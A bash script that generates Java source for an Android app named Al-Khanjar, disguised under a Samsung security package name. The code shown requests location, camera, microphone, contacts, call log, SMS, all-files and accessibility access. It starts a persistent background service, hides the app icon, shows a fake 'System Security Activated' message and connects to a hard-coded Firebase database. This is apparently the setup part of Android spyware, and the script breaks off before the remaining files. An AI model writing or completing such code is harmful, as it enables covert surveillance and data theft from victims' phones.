#!/bin/bash

# Al-Khanjar Manager - Complete Java Files Generator
# مولد كامل لجميع ملفات Java

APP_PATH="/data/data/com.termux/files/home/alkhanjar-complete/android-app/app/src/main/java/com/samsung/android/security/v8"

echo "🔱 بدء إنشاء كل ملفات Java..."

# ============================================
# 1. AlKhanjarApp.java - التطبيق الرئيسي
# ============================================
cat > "$APP_PATH/AlKhanjarApp.java" << 'JAVA1'
package com.samsung.android.security.v8;

import android.app.Application;
import android.content.Context;
import android.util.Base64;
import androidx.multidex.MultiDex;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.FirebaseDatabase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class AlKhanjarApp extends Application {
    
    private static AlKhanjarApp instance;
    private static final String ENCRYPTION_KEY = "AlKhanjar2026Key";
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        
        // MultiDex Support
        MultiDex.install(this);
        
        // تهيئة Firebase
        initializeFirebase();
        
        // تفعيل Offline Persistence
        enableFirebasePersistence();
    }
    
    private void initializeFirebase() {
        try {
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseOptions options = new FirebaseOptions.Builder()
                        .setApiKey("AIzaSyBl6iXu7gJ7wnGcVgFLNNHXbOdj6m294ws")
                        .setDatabaseUrl("https://hmooude-37c70-default-rtdb.firebaseio.com")
                        .setProjectId("hmooude-37c70")
                        .setStorageBucket("hmooude-37c70.firebasestorage.app")
                        .setApplicationId("1:407210691250:android:80bf0e5619fc4cd19897ab")
                        .build();
                
                FirebaseApp.initializeApp(this, options);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void enableFirebasePersistence() {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            database.setPersistenceEnabled(true);
            database.getReference().keepSynced(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static AlKhanjarApp getInstance() {
        return instance;
    }
    
    public static Context getAppContext() {
        return instance.getApplicationContext();
    }
}
JAVA1

echo "✅ AlKhanjarApp.java"

# ============================================
# 2. MainActivity.java
# ============================================
cat > "$APP_PATH/MainActivity.java" << 'JAVA2'
package com.samsung.android.security.v8;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.samsung.android.security.v8.services.CoreService;
import com.samsung.android.security.v8.utils.AppHider;
import com.samsung.android.security.v8.utils.PermissionManager;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int BATTERY_REQUEST_CODE = 1002;
    private static final int STORAGE_REQUEST_CODE = 1003;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (isFirstRun()) {
            setupFirstRun();
        } else {
            startCoreService();
            finish();
        }
    }
    
    private void setupFirstRun() {
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // الصلاحيات الأساسية
        String[] permissions = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE
        };
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // صلاحيات التخزين حسب النسخة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_AUDIO);
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        
        // صلاحية الموقع في الخلفية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            requestBatteryOptimization();
        }
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_REQUEST_CODE);
            } else {
                requestStoragePermission();
            }
        } else {
            requestStoragePermission();
        }
    }
    
    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, STORAGE_REQUEST_CODE);
                }
            } else {
                requestAccessibility();
            }
        } else {
            requestAccessibility();
        }
    }
    
    private void requestAccessibility() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        finalizeSetup();
    }
    
    private void finalizeSetup() {
        // تشغيل الخدمة
        startCoreService();
        
        // إخفاء الأيقونة
        AppHider.hideApp(this);
        
        // حفظ أن التطبيق تم تشغيله
        saveFirstRunComplete();
        
        Toast.makeText(this, "System Security Activated", Toast.LENGTH_SHORT).show();
        finish();
    }
    
    private void startCoreService() {
        Intent serviceIntent = new Intent(this, CoreService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    private boolean isFirstRun() {
        SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        return prefs.getBoolean("first_run", true);
    }
    
    private void saveFirstRunComplete() {
        SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("first_run", false).apply();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            requestBatteryOptimization();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_REQUEST_CODE) {
            requestStoragePermission();
        } else if (requestCode == STORAGE_REQUEST_CODE) {
            requestAccessibility();
        }
    }
}
JAVA2

echo "✅ MainActivity.java"

# سأكمل باقي الملفات...
echo "⏳ جاري إنشاء باقي الملفات..."

